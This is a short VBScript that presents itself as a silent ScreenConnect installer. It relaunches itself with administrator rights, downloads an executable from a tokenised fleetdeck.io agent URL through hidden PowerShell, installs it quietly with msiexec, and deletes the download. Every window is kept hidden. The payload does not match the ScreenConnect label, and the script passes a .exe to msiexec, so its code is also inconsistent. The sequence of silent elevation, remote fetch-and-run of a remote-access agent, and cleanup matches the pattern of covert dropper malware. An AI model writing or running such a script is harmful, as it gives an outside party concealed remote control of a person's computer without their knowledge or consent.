' ScreenConnect Silent Installer - No Popups
Set WshShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' Check if running as Administrator
If Not WScript.Arguments.Named.Exists("elevate") Then
    ' Relaunch as Administrator silently
    Set ShellApp = CreateObject("Shell.Application")
    ShellApp.ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /elevate", "", "runas", 0
    WScript.Quit
End If

' Set paths
msiUrl = "https://agent.fleetdeck.io/9XMExaxtNpf7uYDkmHbgWS?win"
msiPath = "C:\Windows\Temp\fleetdeck-agent.exe"

' Download the MSI silently using PowerShell
downloadCommand = "powershell -Command ""Try { (New-Object Net.WebClient).DownloadFile('" & msiUrl & "', '" & msiPath & "'); Exit 0 } Catch { Exit 1 }"""
WshShell.Run downloadCommand, 0, True

' Check if download worked and install
If fso.FileExists(msiPath) Then
    ' Install the MSI completely silently
    WshShell.Run "msiexec /i """ & msiPath & """ /qn /norestart", 0, True
    
    ' Clean up downloaded file silently
    On Error Resume Next
    fso.DeleteFile(msiPath)
End If

' Exit silently
WScript.Quit